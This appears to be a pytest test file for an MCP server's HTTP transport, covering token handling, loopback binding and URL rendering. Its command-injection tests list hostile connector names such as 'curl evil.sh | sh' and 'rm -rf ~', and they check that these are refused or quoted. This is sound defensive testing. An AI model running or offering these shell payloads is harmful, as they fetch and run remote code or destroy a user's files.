"""Remote MCP transport (RFC-017): loopback HTTP behind a capability path."""

from pathlib import Path

import pytest
from typer.testing import CliRunner

from wingman.cli.main import app
from wingman.infrastructure.config import load_config
from wingman.mcp_server import _http_token, main, render_urls, server

cli = CliRunner()


@pytest.fixture
def workspace(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    data_dir = tmp_path / "ws"
    monkeypatch.setenv("WINGMAN_DATA_DIR", str(data_dir))
    return data_dir


class RunRecorder:
    def __init__(self) -> None:
        self.calls: list[tuple[tuple, dict]] = []

    def __call__(self, *args: object, **kwargs: object) -> None:
        self.calls.append((args, kwargs))


def test_token_is_persistent_secret_and_rotatable(workspace: Path) -> None:
    config = load_config()
    token = _http_token(config)
    assert len(token) >= 24
    token_path = workspace / "mcp-http-token"
    assert token_path.exists()
    assert (token_path.stat().st_mode & 0o777) == 0o600  # owner-only
    assert _http_token(config) == token  # stable across runs
    rotated = _http_token(config, rotate=True)
    assert rotated != token  # rotation is revocation


def test_default_invocation_stays_stdio(workspace: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    recorder = RunRecorder()
    monkeypatch.setattr(server, "run", recorder)
    main([])
    assert recorder.calls == [((), {})]  # no transport argument: stdio default
    assert not (workspace / "mcp-http-token").exists()  # no token unless HTTP is asked for


def test_http_invocation_configures_capability_path(
    workspace: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    recorder = RunRecorder()
    monkeypatch.setattr(server, "run", recorder)
    main(["--http", "--port", "9911"])
    assert recorder.calls == [((), {"transport": "streamable-http"})]
    assert server.settings.host == "127.0.0.1"
    assert server.settings.port == 9911
    token = _http_token(load_config())
    assert server.settings.streamable_http_path == f"/mcp/{token}"
    out = capsys.readouterr()
    assert f"http://127.0.0.1:9911/mcp/{token}" in out.out
    assert "rotate-token" in out.out
    assert "WARNING" not in out.err  # loopback bind warns about nothing


def test_non_loopback_bind_warns(
    workspace: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr(server, "run", RunRecorder())
    main(["--http", "--host", "0.0.0.0", "--port", "9912"])
    assert "WARNING" in capsys.readouterr().err


def test_rotate_token_requires_http(workspace: Path) -> None:
    with pytest.raises(SystemExit):
        main(["--rotate-token"])


def test_render_urls_is_pure_formatting_over_given_inputs() -> None:
    bare = render_urls("TOK", [], host="127.0.0.1", port=8787, prefix="")
    assert bare == [
        "MCP over HTTP: http://127.0.0.1:8787/mcp/TOK",
        "Web UI (read + upload): http://127.0.0.1:8787/ui/TOK",
    ]
    tunneled = render_urls("TOK", ["lobster.tail.ts.net"], port=9911, prefix="trent/")
    assert tunneled == [
        "MCP over HTTP: http://127.0.0.1:9911/trent/mcp/TOK",
        "Web UI (read + upload): http://127.0.0.1:9911/trent/ui/TOK",
        "Tunnel MCP connector: https://lobster.tail.ts.net/trent/mcp/TOK",
        "Tunnel web UI: https://lobster.tail.ts.net/trent/ui/TOK/",
    ]  # prefix normalization ("trent/" -> "/trent") applies here too


def test_render_urls_honors_an_explicit_tunnel_port() -> None:
    """A tunnel front on a non-443 port (e.g. two instances sharing one
    Tailscale hostname on distinct funnel ports) only changes the tunnel
    lines — the loopback lines still reflect the local --port, unrelated."""
    lines = render_urls(
        "TOK", ["lobster.tail.ts.net"], port=8788, prefix="/trent", tunnel_port=8443
    )
    assert lines == [
        "MCP over HTTP: http://127.0.0.1:8788/trent/mcp/TOK",
        "Web UI (read + upload): http://127.0.0.1:8788/trent/ui/TOK",
        "Tunnel MCP connector: https://lobster.tail.ts.net:8443/trent/mcp/TOK",
        "Tunnel web UI: https://lobster.tail.ts.net:8443/trent/ui/TOK/",
    ]
    assert render_urls("TOK", ["lobster.tail.ts.net"])[2] == (
        "Tunnel MCP connector: https://lobster.tail.ts.net/mcp/TOK"
    )  # tunnel_port=None (default): no port suffix, unchanged behavior


def test_render_urls_tunnel_prefix_only_touches_tunnel_lines() -> None:
    """RFC-048's shared process is mounted behind a STRIPPING tailscale
    front ('tailscale funnel --set-path /shared') and itself always runs
    with no --prefix -- 'tunnel_prefix' is a separate knob from 'prefix'
    for exactly that split: it must appear in the tunnel URLs and nowhere
    else, or a shared-process operator gets a URL that 404s at the
    tunnel (found live migrating dhk's own account, RFC-048 Phase 3)."""
    lines = render_urls("TOK", ["lobster.tail.ts.net"], port=8789, tunnel_prefix="/shared")
    assert lines == [
        "MCP over HTTP: http://127.0.0.1:8789/mcp/TOK",
        "Web UI (read + upload): http://127.0.0.1:8789/ui/TOK",
        "Tunnel MCP connector: https://lobster.tail.ts.net/shared/mcp/TOK",
        "Tunnel web UI: https://lobster.tail.ts.net/shared/ui/TOK/",
    ]
    # normalizes the same way 'prefix' does: leading/trailing slashes optional
    assert render_urls("TOK", ["h"], tunnel_prefix="shared/")[2] == (
        "Tunnel MCP connector: https://h/shared/mcp/TOK"
    )
    # default '' means unchanged behavior -- no prefix in the tunnel URL either
    assert render_urls("TOK", ["h"])[2] == "Tunnel MCP connector: https://h/mcp/TOK"
    # left at its default, the tunnel line falls BACK to 'prefix' -- the
    # pass-through-front case (nginx/Caddy) this parameter didn't change
    assert render_urls("TOK", ["h"], prefix="/trent")[2] == (
        "Tunnel MCP connector: https://h/trent/mcp/TOK"
    )
    # given, 'tunnel_prefix' OVERRIDES 'prefix' for the tunnel line only --
    # the loopback line keeps using 'prefix' unchanged
    overridden = render_urls("TOK", ["h"], prefix="/trent", tunnel_prefix="/shared")
    assert overridden[0] == "MCP over HTTP: http://127.0.0.1:8787/trent/mcp/TOK"
    assert overridden[2] == "Tunnel MCP connector: https://h/shared/mcp/TOK"


def test_connector_name_adds_claude_mcp_add_after_each_mcp_url() -> None:
    """Issue #253: a ready-to-paste 'claude mcp add' line next to every MCP
    url (loopback and tunnel), never after a web UI url -- 'claude mcp
    add' has nothing to do with that surface. Left at the default (""),
    output is unchanged from before this parameter existed."""
    bare = render_urls("TOK", [], connector_name="")
    assert bare == [
        "MCP over HTTP: http://127.0.0.1:8787/mcp/TOK",
        "Web UI (read + upload): http://127.0.0.1:8787/ui/TOK",
    ]  # default: byte-identical to before this parameter existed

    named = render_urls("TOK", ["lobster.tail.ts.net"], port=9911, connector_name="wingman-taylor")
    assert named == [
        "MCP over HTTP: http://127.0.0.1:9911/mcp/TOK",
        (
            "Claude Code (paste this): claude mcp add --transport http wingman-taylor "
            "http://127.0.0.1:9911/mcp/TOK"
        ),
        "Web UI (read + upload): http://127.0.0.1:9911/ui/TOK",
        "Tunnel MCP connector: https://lobster.tail.ts.net/mcp/TOK",
        (
            "Claude Code (paste this): claude mcp add --transport http wingman-taylor "
            "https://lobster.tail.ts.net/mcp/TOK"
        ),
        "Tunnel web UI: https://lobster.tail.ts.net/ui/TOK/",
    ]


def test_a_connector_name_cannot_smuggle_a_second_shell_command() -> None:
    """This line exists to be pasted into a shell without being read, so a
    metacharacter in it is not a display bug — it is a second command that
    runs on the next paste.

    The name reaches here from an MCP tool argument (a prompt-injected model
    can pick it), a CLI flag, or 'wingman-<slug>' off a registry whose slugs
    are only checked for being non-empty.
    """
    from wingman.mcp_server import ConnectorNameError

    for hostile in (
        "wingman; curl evil.sh | sh",
        "wingman && rm -rf ~",
        "wingman$(whoami)",
        "wingman`id`",
        "wingman\nclaude mcp add other http://evil",
        "-rf",
        "",
        " wingman",
    ):
        with pytest.raises(ConnectorNameError):
            from wingman.mcp_server import validate_connector_name

            validate_connector_name(hostile)


def test_a_hostile_connector_name_is_refused_before_any_url_is_printed() -> None:
    """Refusing beats sanitizing: a silently rewritten name renders a command
    that works and registers a connector nobody asked for."""
    from wingman.mcp_server import ConnectorNameError

    with pytest.raises(ConnectorNameError):
        render_urls("TOK", [], connector_name="wingman; rm -rf ~")


def test_an_unvalidated_url_component_is_quoted_rather_than_pasted_raw() -> None:
    """Hosts and prefixes are validated nowhere and arrive from a tunnel
    hostname or a --prefix flag. shlex.quote is a no-op on anything ordinary
    (see the test above, which still asserts a bare unquoted command), so
    this costs the normal case nothing."""
    lines = render_urls("TOK", ["evil$(id).example"], connector_name="wingman")

    paste = next(line for line in lines if "paste this" in line and "evil" in line)
    assert "$(id)" in paste
    assert "'https://evil$(id).example/mcp/TOK'" in paste


def test_tunnel_port_cli_flag_wins_over_env(monkeypatch: pytest.MonkeyPatch) -> None:
    from wingman.mcp_server import _tunnel_port

    monkeypatch.setenv("WINGMAN_TUNNEL_PORT", "9999")
    assert _tunnel_port(8443) == 8443  # explicit value wins
    assert _tunnel_port(None) == 9999  # falls back to the env var
    monkeypatch.delenv("WINGMAN_TUNNEL_PORT")
    assert _tunnel_port(None) is None  # unset means 'omit it, assume 443'


def test_mcp_url_command_honors_explicit_tunnel_port(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    result = cli.invoke(
        app,
        [
            "mcp",
            "url",
            "--port",
            "8788",
            "--prefix",
            "/trent",
            "--allowed-host",
            "lobster.tail.ts.net",
            "--tunnel-port",
            "8443",
        ],
    )
    assert result.exit_code == 0
    token = _http_token(load_config())
    assert (
        f"Tunnel MCP connector: https://lobster.tail.ts.net:8443/trent/mcp/{token}" in result.output
    )
    assert f"Tunnel web UI: https://lobster.tail.ts.net:8443/trent/ui/{token}/" in result.output


def test_mcp_url_command_prints_the_capability_urls(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    result = cli.invoke(app, ["mcp", "url", "--port", "9914"])
    assert result.exit_code == 0
    token = _http_token(load_config())
    assert f"http://127.0.0.1:9914/mcp/{token}" in result.output
    assert f"http://127.0.0.1:9914/ui/{token}" in result.output


def test_mcp_url_command_honors_explicit_allowed_host(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    result = cli.invoke(
        app, ["mcp", "url", "--port", "9915", "--allowed-host", "lobster.example.ts.net"]
    )
    assert result.exit_code == 0
    token = _http_token(load_config())
    assert f"Tunnel MCP connector: https://lobster.example.ts.net/mcp/{token}" in result.output
    assert f"Tunnel web UI: https://lobster.example.ts.net/ui/{token}/" in result.output


def test_mcp_url_command_hints_when_no_tunnel_detected(workspace: Path) -> None:
    # The "no tunnel" precondition is built by the autouse _no_ambient_tunnel
    # fixture, which shadows the tailscale binary. Previously this asserted an
    # absence it never constructed, so it passed only on hosts that happened
    # to have no tailnet (#290).
    result = cli.invoke(app, ["mcp", "url", "--port", "9916"])

    assert result.exit_code == 0
    assert "no tunnel hostname detected" in result.output
    assert "Tunnel MCP connector" not in result.output


def test_mcp_url_command_does_not_hint_when_a_front_door_is_known(workspace: Path) -> None:
    """The other half: the hint must disappear when there IS a tunnel.

    Without this, the test above passes just as well against a command that
    prints the hint unconditionally.
    """
    result = cli.invoke(
        app, ["mcp", "url", "--port", "9916", "--allowed-host", "lobster.example.ts.net"]
    )

    assert result.exit_code == 0
    assert "no tunnel hostname detected" not in result.output
    assert "Tunnel MCP connector: https://lobster.example.ts.net/mcp/" in result.output


def test_mcp_url_command_defaults_to_a_claude_mcp_add_command(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Issue #253: 'wingman mcp url' defaults --connector-name to 'wingman'
    with no flag needed, so the ready-to-paste command shows up unprompted."""
    result = cli.invoke(app, ["mcp", "url", "--port", "9917"])
    assert result.exit_code == 0
    token = _http_token(load_config())
    assert (
        f"claude mcp add --transport http wingman http://127.0.0.1:9917/mcp/{token}"
        in result.output
    )


def test_mcp_url_command_connector_name_override_and_suppression(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    result = cli.invoke(app, ["mcp", "url", "--port", "9918", "--connector-name", "my-wingman"])
    assert result.exit_code == 0
    token = _http_token(load_config())
    assert f"claude mcp add --transport http my-wingman http://127.0.0.1:9918/mcp/{token}" in (
        result.output
    )

    suppressed = cli.invoke(app, ["mcp", "url", "--port", "9919", "--connector-name", ""])
    assert suppressed.exit_code == 0
    assert "claude mcp add" not in suppressed.output


def test_prefix_serves_natively_on_the_folder(
    workspace: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """--prefix /trent: the server itself owns the path segment (no proxy strip needed)."""
    monkeypatch.setattr(server, "run", RunRecorder())
    main(["--http", "--port", "9913", "--prefix", "trent/"])  # normalized either way
    token = _http_token(load_config())
    assert server.settings.streamable_http_path == f"/trent/mcp/{token}"
    out = capsys.readouterr().out
    assert f"http://127.0.0.1:9913/trent/mcp/{token}" in out
    assert f"http://127.0.0.1:9913/trent/ui/{token}" in out
